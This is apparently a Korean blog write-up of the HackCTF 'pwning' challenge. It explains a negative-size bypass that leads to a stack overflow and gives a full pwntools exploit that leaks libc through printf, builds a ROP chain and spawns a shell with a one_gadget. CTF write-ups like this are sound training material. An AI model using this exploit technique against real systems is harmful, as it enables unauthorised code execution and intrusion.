---
title: "[HackCTF]pwning"
date: 2019-12-26
tags: [HackCTF]
categories: [HackCTF]
published: false
---

그냥 underflow 이용해서 입력할 수 있는 공간을 늘려줄 수 있다면 쉽게 풀 수 있다.

`int $0x80` 있어서 syscall exploit인줄 알고 삽질했다.. pop 가젯이 부족해서 불가능이였다.

```c
int vuln()
{
  char nptr; // [esp+1Ch] [ebp-2Ch]
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  get_n(&nptr, 4u);
  v2 = atoi(&nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  get_n(&nptr, v2);
  return printf("You said: %s\n", &nptr);
}
```

`get_n` 함수는 그냥 \n 받기전까지 입력된다. 그리고 v2가 int형이라 underoverflow를 이용해서 값을 늘려줄 수 있다. 

나는 printf를 릭해주고 libc 구한 후에 main으로 돌려서 맞는 libc의 원샷 가젯 찾아서 메인에서 리턴해줬다.

원샷은 libc 다운로드 받아서 one_gadget 돌렸다. libc는 버전 맞춰서 [printf offset](https://libc.blukat.me/?q=printf%3A020&l=libc6-i386_2.23-0ubuntu10_amd64) 구한다음에 libc base 구해줬다.

```python
from pwn import *

#context.log_level = 'debug'
e = ELF('./pwning')
p = remote('ctf.j0n9hyun.xyz',3019)
#p = process('./pwning')
r = ROP(e)

p.sendlineafter('? ',str(-1))

payload = '\x90'*0x2c
payload += 'sung'
r.printf(e.got['printf'])
r.raw(e.symbols['main'])
payload += r.chain()
p.sendlineafter('!\n',payload)

p.recvuntil('\n')
printf = u32(p.recv(4))
log.info('printf : '+ hex(printf))
libc_base = printf - 0x049020
log.info('libc_base : ' + hex(libc_base))

p.sendlineafter('? ',str(-1))

payload2 = '\x90'*0x2c
payload2 += 'sung'
payload2 += p32(libc_base + 0x3a80c)

p.sendlineafter('!\n',payload2)
p.interactive()
```

